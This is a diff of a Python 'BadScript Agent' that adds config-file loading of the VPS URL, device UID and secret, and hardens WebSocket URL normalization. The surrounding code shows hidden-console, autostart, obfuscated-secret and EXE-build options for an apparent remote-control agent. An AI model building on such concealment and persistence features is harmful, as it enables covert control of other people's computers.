@@ -1457,13 +1457,22 @@ async def handle_session(ws, fernet, vps_url, uid, secret):
 
 def normalize_ws_url(url: str) -> str:
     """Приводит введённый URL к корректному виду WebSocket URI (ws://host:port/ws/agent/)."""
-    url = url.strip()
+    import re
+    url = (url or "").strip()
+    if not url:
+        return "ws://127.0.0.1:8000/ws/agent/"
+
+    # Убираем лишние слэши после протокола (ws://// -> ws://)
+    url = re.sub(r'^(wss?|https?):/+', r'\1://', url)
     if url.startswith("http://"):
         url = "ws://" + url[7:]
     elif url.startswith("https://"):
         url = "wss://" + url[8:]
     elif not url.startswith(("ws://", "wss://")):
-        url = "ws://" + url
+        url = "ws://" + url.lstrip("/")
+
+    url = re.sub(r'^ws:/+', 'ws://', url)
+    url = re.sub(r'^wss:/+', 'wss://', url)
 
     try:
         parsed = urllib.parse.urlparse(url)
@@ -1562,9 +1571,39 @@ def build_exe():
         log.error("Ошибка сборки EXE")
 
 
+def load_config_env():
+    """Загружает параметры из config.env или config.conf, если они есть."""
+    candidates = [
+        os.path.join(AGENT_DIR, "config.env"),
+        os.path.join(AGENT_DIR, "config.conf"),
+        os.path.join(os.getcwd(), "config.env"),
+        os.path.join(os.getcwd(), "config.conf"),
+        os.path.expanduser("~/.badscript/config.env"),
+        os.path.expanduser("~/.badscript/config.conf"),
+    ]
+    for c in candidates:
+        if os.path.isfile(c):
+            try:
+                with open(c, "r", encoding="utf-8", errors="replace") as f:
+                    for line in f:
+                        line = line.strip()
+                        if not line or line.startswith("#") or "=" not in line:
+                            continue
+                        k, v = line.split("=", 1)
+                        k = k.strip()
+                        v = v.strip().strip('"').strip("'")
+                        if k and not os.environ.get(k):
+                            os.environ[k] = v
+                break
+            except Exception:
+                pass
+
+
 def main():
+    load_config_env()
+
     parser = argparse.ArgumentParser(description="BadScript Agent")
-    parser.add_argument("--vps", default="ws://127.0.0.1:8000/ws/agent/", help="VPS WebSocket URL")
+    parser.add_argument("--vps", default="", help="VPS WebSocket URL")
     parser.add_argument("--uid", required=False, help="Device UID from dashboard")
     parser.add_argument("--secret", required=False, help="Device secret token")
     parser.add_argument("--hidden", action="store_true", help="Hide console on Windows")
@@ -1578,17 +1617,21 @@ def main():
         build_exe()
         return
 
-    secret = args.secret or ""
+    # Берём параметры из CLI или из config.env / config.conf
+    vps_url = (args.vps or "").strip() or os.environ.get("VPS_URL", "").strip() or "ws://127.0.0.1:8000/ws/agent/"
+    vps_url = normalize_ws_url(vps_url)
+
+    uid = (args.uid or "").strip() or os.environ.get("DEVICE_UID", "").strip()
+    secret = (args.secret or "").strip() or os.environ.get("DEVICE_SECRET", "").strip()
+
     if secret.startswith("OBF:"):
         secret = _deobfuscate(secret)
 
-    uid = args.uid or ""
-
     if args.install:
         if not uid or not secret:
-            log.error("Для установки автозапуска требуются --uid и --secret")
+            log.error("Для установки автозапуска требуются --uid и --secret (или файл config.env)")
             return
-        ok, msg = install_autostart(args.vps, uid, secret)
+        ok, msg = install_autostart(vps_url, uid, secret)
         print(msg)
         return
 
@@ -1598,7 +1641,7 @@ def main():
         return
 
     if not uid or not secret:
-        log.error("Ошибка: укажите --uid и --secret для запуска агента!")
+        log.error("Ошибка: не указаны UID и SECRET! Укажите их параметрами --uid и --secret или в файле config.env")
         parser.print_help()
         sys.exit(1)
 
@@ -1610,7 +1653,7 @@ def main():
     log.info("Запуск агента BadScript (UID: %s)", uid)
 
     try:
-        asyncio.run(run_agent(args.vps, uid, secret))
+        asyncio.run(run_agent(vps_url, uid, secret))
     except KeyboardInterrupt:
         log.info("Агент остановлен пользователем.")
 
